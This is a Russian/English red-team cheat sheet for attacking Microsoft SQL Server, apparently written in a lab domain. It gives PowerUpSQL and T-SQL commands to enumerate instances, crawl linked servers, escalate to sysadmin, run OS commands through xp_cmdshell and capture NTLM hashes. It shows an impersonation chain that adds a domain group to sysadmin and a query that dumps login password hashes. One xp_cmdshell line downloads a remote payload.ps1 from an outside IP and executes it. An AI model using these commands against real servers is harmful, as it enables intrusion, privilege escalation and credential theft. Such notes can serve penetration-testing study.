# MSSQL

## Инструменты

Подключение к базе - HeidiSQL

Abuse - [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

## About MSSQL

### Ports and queries

To communicate to an SQL server it is possible to use the [TDS](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec) protocol directly over [TCP or using SMB](https://docs.microsoft.com/en-us/sql/sql-server/install/configure-the-windows-firewall-to-allow-sql-server-access?view=sql-server-ver15#BKMK\_ssde). In case of using TCP, the default port is 1433, but is also possible to use a dynamic port.

When a [dynamic port](https://docs.microsoft.com/en-us/sql/sql-server/install/configure-the-windows-firewall-to-allow-sql-server-access?view=sql-server-ver15#BKMK\_dynamic\_ports) is used, a random TCP port is selected. To allow a remote client to discover this port, the SQL Server Browser must be enabled in the UDP port 1434, waiting for [SQLR](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/mc-sqlr/1ea6e25f-bff9-4364-ba21-5dc449a601b7) (SQL Server Resolution) queries. You can use the impacket [mssqlinstance.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlinstance.py) tool to discover the SQL server dynamic port.

```
$ mssqlinstance.py 192.168.100.19
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Instance 0
ServerName:SRV01
InstanceName:SQLEXPRESS
IsClustered:No
Version:15.0.2000.5
[*] Instance 1
ServerName:SRV01
InstanceName:MSSQLSERVER
IsClustered:No
Version:15.0.2000.5
tcp:50377
```

Here, you can see that the SQL Server port is 50377, now you can use a SQL Server client like [HeidiSQL](https://www.heidisql.com/), [SQL Server Management Studio](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver15), or [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/) to connect to the database.

```powershell
PS C:\> . .\PowerUpSQL.ps1
PS C:\> Get-SQLQuery -Query "Select @@version" -Instance "srv01,50377"

Column1
-------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ...
```

### xp\_cmdshell

An important aspect of SQL server is the ability to execute commands through the `xp_cmdshell` command, if it is allowed. Sometimes in misconfigured environments, even if the [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) command is disabled, the user has enough privileges to [enable it with the `sp_configure` directive](https://www.tarlogic.com/en/blog/red-team-tales-0x01/).

### xp\_dirtree

Moreover, the `xp_dirtree` command can be useful to access to files of the network (using UNC paths) or for making authenticated requests to other machines, by using the domain computer account in order to [recollect NTLM hashes](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478) to crack or perform [NTLM relay](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#case-study-1-mssql-rcelpe).

### SQL Server Links

Additionally, an incredible useful characteristic for an attacker could be the **SQL Server links**. SQL Server allows to create links with other data sources, like other SQL databases.

The interesting thing about those links is that even if they are created by a privileged user like an administrator, they can be used by any user and will allow to [execute commands in remote machines](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/) with the privileges of the link creator.

```
                         .---.                             .---.
                        /   /|         SQL link           /   /|
   o                   .---. | ========================= .---. |
  /|\  ---unpriv---->  |   | '  ---------dbadmin------>  |   | '
  / \                  |   |/  ========================= |   |/ 
                       '---'                             '---'  
                        db1                               db2
```

Additionally, if you like pivoting through SQL Server you can also convert it in a SOCKS proxy by using [mssqlproxy](https://github.com/blackarrowsec/mssqlproxy).

For more ways to abuse SQL Servers, you can use the [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/) toolkit and definitely, you should check its [wiki](https://github.com/NetSPI/PowerUpSQL/wiki).

Получить линки на другие базы через PowerUpSQL

```
PS> Get-SQLServerLink -Instance devsrv.example.local -Verbose
PS> Get-SQLServerLinkCrawl -Instance devsrv.example.local -Verbose
PS> Get-SQLServerLinkCrawl -Instance devsrv.example.local -Query ‘exec master..xp_cmdshell “whoami”’
```

## Примеры

По умолчанию, все запросы делаются от локального пользователя

```
Найти инстансы в домене
Get-SQLInstanceDomain -Verbose

Пример запроса
Get-SQLQuery -Instance UFC-SQLDev.us.funcorp.local -Verbose -Query "Select @@version"

Информация о SQL сервере
Get-SQLServerInfo -Verbose -Instance UFC-SQLDev.us.funcorp.local

Дамп информации о базах, пользователях, таблицах...
Invoke-SQLDumpInfo -Verbose -Instance UFC-SQLDev.us.funcorp.local

Посмотреть информацию о базе:
Get-SQLDatabase -Instance UFC-SQLDev.us.funcorp.local -NoDefaults [-HasAccess]

Аудит:
Invoke-SQLAudit -Instance UFC-SQLDev.us.funcorp.local

PrivEsc to sysadmin (использует подходы, определенные на предыдущем шаге, но иногда надо разобраться)
Invoke-SQLEscalatePriv -Instance UFC-SQLDev.us.funcorp.local -Verbose

Исполнение команд (уже есть sysadmin)
Вызвать просто команду OS:
Invoke-SQLOSCmd -Verbose -Command "Whoami" -Instance <Instance>

Вызвать скрипт PowerShell (в фоновом режиме отработает):
Invoke-SQLOSCmdAgentJob -Verbose -SubSystem PowerShell -Command 'write-output "hello world" | out-file c:\windows\temp\test2.txt' -Sleep 20

Test connectivity: 
EXEC xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.50.217:4242/payload.ps1')";
```

### Impersonate

Запускаем из-под контекста USFUN\PA-User217 через HeidiSQL мы сначала переходим в контекст dbuser, а потом в sa, и там добавляем RDPUsers группу в sysadmin

```sql
SELECT IS_SRVROLEMEMBER('sysadmin', 'USFUN\RDPUsers') AS StatusPre;

EXECUTE AS LOGIN = 'dbuser'; 
	EXECUTE AS LOGIN = 'sa'; 
		SELECT @@VERSION AS VERSION ;
		EXEC sp_addsrvrolemember 'USFUN\RDPUsers','sysadmin'; 
	REVERT; 
REVERT;

SELECT IS_SRVROLEMEMBER('sysadmin', 'USFUN\RDPUsers') AS StatusPro;
```

### Пользователи и хеши

```sql
SELECT 
	sp.name as login, 
	sp.type_desc as login_type, 
	CONVERT([varchar](512),sl.password_hash,2), 
	sp.create_date, 
	sp.modify_date, 
	case 
		when sp.is_disabled = 1 then 'Disabled' 
		else 'Enabled' 
	end as status 
	from sys.server_principals sp 
left join sys.sql_logins sl 
on sp.principal_id = sl.principal_id 
where sp.type not in ('G', 'R') 
order by sp.name;
```
